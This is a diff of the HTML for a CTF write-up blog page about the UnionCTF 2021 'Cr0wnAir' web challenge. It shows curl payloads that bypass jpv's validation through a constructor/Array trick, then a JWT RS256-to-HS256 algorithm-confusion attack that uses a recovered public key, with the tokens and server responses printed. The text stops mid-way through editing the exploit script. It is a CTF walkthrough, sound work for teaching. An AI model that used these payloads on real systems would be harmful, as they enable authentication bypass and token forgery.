@@ -3,23 +3,21 @@
   <head>
     <title>[UnionCTF 2021 - web] Cr0wnAir // ret2school</title>
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="generator" content="Hugo 0.92.2" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="author" content="nasm" />
     <meta name="description" content="" />
     <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
 
     
-<script type="application/javascript">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8K5XT0SJN8"></script>
+<script>
 var doNotTrack = false;
 if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'G-8K5XT0SJN8', 'auto');
-	
-	ga('send', 'pageview');
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8K5XT0SJN8', { 'anonymize_ip': false });
 }
 </script>
 
@@ -32,9 +30,10 @@ UnionCTF - Cr0wnAir To solve this challenge, we had to exploit a vulnerability i
 <meta property="og:description" content="The challenge can be found right here.
 UnionCTF - Cr0wnAir To solve this challenge, we had to exploit a vulnerability in jpv which allows us to bypass the regex validation in order to get a JWT. Then, we were able to change the algorithm from RS256 to HS256 and forge a new JWT with the public key, a key that we were able to retrieve thanks to a weak e." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://ret2school.github.io/post/writeup_cr0wnair/" />
+<meta property="og:url" content="https://ret2school.github.io/post/writeup_cr0wnair/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2021-02-24T00:00:00+00:00" />
 <meta property="article:modified_time" content="2021-02-24T00:00:00+00:00" />
+
 
 
   </head>
@@ -101,7 +100,7 @@ UnionCTF - Cr0wnAir To solve this challenge, we had to exploit a vulnerability i
 <h1 id="unionctf---cr0wnair">UnionCTF - Cr0wnAir</h1>
 <p>To solve this challenge, we had to exploit a vulnerability in <code>jpv</code> which allows us to bypass the regex validation in order to get a JWT. Then, we were able to change the algorithm from <code>RS256</code> to <code>HS256</code> and forge a new JWT with the public key, a key that we were able to retrieve thanks to a weak <code>e</code>.</p>
 <p>The source code of the app is given, so let&rsquo;s take a look at it (only what will be interesting for us) :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
 <span style="color:#6272a4">// routes/checkin.js
 </span><span style="color:#6272a4"></span>
 <span style="color:#ff79c6">const</span> express <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#39;express&#39;</span>);
@@ -163,7 +162,7 @@ router.post(<span style="color:#f1fa8c">&#39;/checkin&#39;</span>, <span style="
 
 module.exports <span style="color:#ff79c6">=</span> router;
 
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
 <span style="color:#6272a4">// routes/upgrades.js
 </span><span style="color:#6272a4"></span>
 <span style="color:#ff79c6">const</span> express <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#39;express&#39;</span>);
@@ -221,7 +220,7 @@ router.post(<span style="color:#f1fa8c">&#39;/flag&#39;</span>, [getLoyaltyStatu
 module.exports <span style="color:#ff79c6">=</span> router;
 </code></pre></div><p>After the analysis of the source code, we can notice an interesting path : we need to set <code>sssr</code> to <code>FQTU</code> to receive our JWT. And with this JWT, if the <code>status</code> is set to <code>gold</code>, we get the flag.
 However, the data we send to <code>/checkin</code> must check some regex :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
 <span style="color:#ff79c6">const</span> pattern <span style="color:#ff79c6">=</span> {
   firstName<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">/^\w{1,30}$/</span>,
   lastName<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">/^\w{1,30}$/</span>,
@@ -259,14 +258,14 @@ router.post(<span style="color:#f1fa8c">&#39;/checkin&#39;</span>, <span style="
 });
 
 </code></pre></div><p>Indeed, if we try what we said (i.e. set <code>sssr</code> to <code>FQTU</code>) it will not be accepted by the regex and we will not get our JWT :( :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
 $ curl <span style="color:#f1fa8c">&#39;http://34.105.202.19:3000/checkin&#39;</span> -H <span style="color:#f1fa8c">&#39;Content-Type: application/json&#39;</span> --data-raw <span style="color:#f1fa8c">&#39;{&#34;firstName&#34;:&#34;tytyr&#34;,&#34;lastName&#34;:&#34;rtyry&#34;,&#34;passport&#34;:&#34;123456789&#34;,&#34;ffp&#34;:&#34;CA12345678&#34;,&#34;extras&#34;:[{&#34;sssr&#34;:&#34;FQTU&#34;}]}&#39;</span>
 <span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;msg&#34;</span>:<span style="color:#f1fa8c">&#34;Invalid checkin data provided, please try again.&#34;</span><span style="color:#ff79c6">}</span>
 
 </code></pre></div><p>After a careful rereading, we did not notice any bug in the app ; so maybe some libraries (<code>jpv</code> and <code>jwt-simple</code>, to match our path) are vulnerable.
 The answer is yes ! If we check the version of <code>jpv</code> we see that it is an old version released 2 years ago. Moreover, on the github of <code>jpv</code> there are some validation bypasses.
 <a href="https://github.com/manvel-khnkoyan/jpv/issues/6">This issue</a> will help us :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
 <span style="color:#f1fa8c">&#34;use strict&#34;</span>;
 
 <span style="color:#8be9fd;font-style:italic">var</span> jpv <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#39;jpv&#39;</span>);
@@ -283,20 +282,20 @@ The answer is yes ! If we check the version of <code>jpv</code> we see that it i
 console.log(jpv.validate(user_input, pattern));
 
 </code></pre></div><p>It is said that we can bypass the validation when the pattern expect an array. So let&rsquo;s try that :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
 $ curl <span style="color:#f1fa8c">&#39;http://34.105.202.19:3000/checkin&#39;</span> -H <span style="color:#f1fa8c">&#39;Content-Type: application/json&#39;</span> --data-raw <span style="color:#f1fa8c">&#39;{&#34;firstName&#34;:&#34;aa&#34;,&#34;lastName&#34;:&#34;aaa&#34;,&#34;passport&#34;:&#34;123456789&#34;,&#34;ffp&#34;:&#34;CA12345678&#34;,&#34;extras&#34;:{&#34;a&#34;:{&#34;sssr&#34;:&#34;FQTU&#34;}, &#34;constructor&#34;:{&#34;name&#34;:&#34;Array&#34;}}}&#39;</span>
 <span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;msg&#34;</span>:<span style="color:#f1fa8c">&#34;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.&#34;</span>,<span style="color:#f1fa8c">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc4In0.IQMSxgcZTmvVNJl51Xe71AtJI6vlINPb0GRy9GmxiLx6WsyFhSs-VXJh8G40TIYSD8LHfQGGxQVoK9Mnn8ImOz0Nv8BROkZ4fNiPEGXEIVaYNR2mzHc4_dARuciASyEdBapLrhlr7ln_EG6vKltB-KgsCfhJErVUOyvwfaZ0HdzJ6CQrS5-go33E7MpVe9LEsP7ySkbTdDxNsLmU64H2NqnWAxckQdEXlO2kMRWzsiCbvwOLY_hlEI2VwMuIqnFChI4McxBsCmel-mo7U6SEjfNyD7sEm3IglfGhW-RGsaR2xI4QuTsnjTRek51k2E-LC3W21AiWZ87jPbpwAXlCKg&#34;</span><span style="color:#ff79c6">}</span>%
 
 </code></pre></div><p>Nice ! We now have our JWT.
 If we remember the source code, the application decodes our JWT without specifying the algorithm. Thanks to this mistake and the absence of verification by the library, we can change the algorithm specified in our JWT from <code>RS256</code> (asymetric) to <code>HS256</code> (symetric algorithm) and the app will try to decode our JWT with the public key and the <code>HS256</code> algorithm :</p>
 <p>the lines where the app encodes/decodes JWT :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
 jwt.encode(body, config.privkey, <span style="color:#f1fa8c">&#39;RS256&#39;</span>);
 [...]
 jwt.decode(token, config.pubkey);
 
 </code></pre></div><p>and the library <a href="https://github.com/hokaccha/node-jwt-simple/blob/v0.5.1/lib/jwt.js#L58">source code</a> :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
 <span style="color:#6272a4">/**
 </span><span style="color:#6272a4"> * support algorithm mapping
 </span><span style="color:#6272a4"> */</span>
@@ -368,7 +367,7 @@ jwt.decode <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-
 After some googling we can find <a href="https://blog.silentsignal.eu/2021/02/08/abusing-jwt-public-keys-without-the-public-key/">this blog post</a> which tells us that we can retrieve the public key with only two JWT.
 The author of the post has made a script that retrieve the public key and craft a new token using this public key.
 So let&rsquo;s try this script :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
 $ <span style="color:#6272a4"># get 2 jwt</span>
 $ curl <span style="color:#f1fa8c">&#39;http://34.105.202.19:3000/checkin&#39;</span> -H <span style="color:#f1fa8c">&#39;Content-Type: application/json&#39;</span> --data-raw <span style="color:#f1fa8c">&#39;{&#34;firstName&#34;:&#34;aa&#34;,&#34;lastName&#34;:&#34;aaa&#34;,&#34;passport&#34;:&#34;123456789&#34;,&#34;ffp&#34;:&#34;CA12345678&#34;,&#34;extras&#34;:{&#34;a&#34;:{&#34;sssr&#34;:&#34;FQTU&#34;}, &#34;constructor&#34;:{&#34;name&#34;:&#34;Array&#34;}}}&#39;</span>
 <span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;msg&#34;</span>:<span style="color:#f1fa8c">&#34;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.&#34;</span>,<span style="color:#f1fa8c">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc4In0.IQMSxgcZTmvVNJl51Xe71AtJI6vlINPb0GRy9GmxiLx6WsyFhSs-VXJh8G40TIYSD8LHfQGGxQVoK9Mnn8ImOz0Nv8BROkZ4fNiPEGXEIVaYNR2mzHc4_dARuciASyEdBapLrhlr7ln_EG6vKltB-KgsCfhJErVUOyvwfaZ0HdzJ6CQrS5-go33E7MpVe9LEsP7ySkbTdDxNsLmU64H2NqnWAxckQdEXlO2kMRWzsiCbvwOLY_hlEI2VwMuIqnFChI4McxBsCmel-mo7U6SEjfNyD7sEm3IglfGhW-RGsaR2xI4QuTsnjTRek51k2E-LC3W21AiWZ87jPbpwAXlCKg&#34;</span><span style="color:#ff79c6">}</span>
@@ -391,17 +390,17 @@ $ python3 x_CVE-2017-11424.py <span style="color:#f1fa8c">`</span>cat jwt1<span 
 <span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Tampered JWT: b<span style="color:#f1fa8c">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiYnJvbnplIiwgImZmcCI6ICJDQTEyMzQ1Njc4IiwgImV4cCI6IDE2MTQyMDg1OTl9.mN99DMtBLdPj4yFrLJncAe69XYWBiUersiWjoGhTBnE&#39;</span>
 
 </code></pre></div><p>If we try with the first JWT, it seems that the token is valid but because we didn&rsquo;t set the <code>status</code> to <code>gold</code> we will not get the flag :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
 $ curl -X POST <span style="color:#f1fa8c">&#39;http://34.105.202.19:3000/upgrades/flag&#39;</span> -H <span style="color:#f1fa8c">&#39;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiYnJvbnplIiwgImZmcCI6ICJDQTEyMzQ1Njc4IiwgImV4cCI6IDE2MTQyMDg1OTl9.6rQVuvqT2nGfkFOdS1YmN7Nuc5LapAb339XTJHf9F1Y&#39;</span>
 <span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;msg&#34;</span>:<span style="color:#f1fa8c">&#34;You do not qualify for this upgrade at this time. Please fly with us more.&#34;</span><span style="color:#ff79c6">}</span>
 
 </code></pre></div><p>As contrary, we get an error with the second JWT :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
 $ curl -X POST <span style="color:#f1fa8c">&#39;http://34.105.202.19:3000/upgrades/flag&#39;</span> -H <span style="color:#f1fa8c">&#39;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiAiYnJvbnplIiwgImZmcCI6ICJDQTEyMzQ1Njc4IiwgImV4cCI6IDE2MTQyMDg1OTl9.mN99DMtBLdPj4yFrLJncAe69XYWBiUersiWjoGhTBnE&#39;</span>
 <span style="color:#ff79c6">{</span><span style="color:#f1fa8c">&#34;msg&#34;</span>:<span style="color:#f1fa8c">&#34;Token is not valid.&#34;</span><span style="color:#ff79c6">}</span>
 
 </code></pre></div><p>We just have to take a look at the script and modify it to set <code>status</code> to <code>gold</code> and get the flag :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">
 $ vim x_CVE-2017-11424.py
 $ cat x_CVE-2017-11424.py
 <span style="color:#ff79c6">[</span>...<span style="color:#ff79c6">]</span>
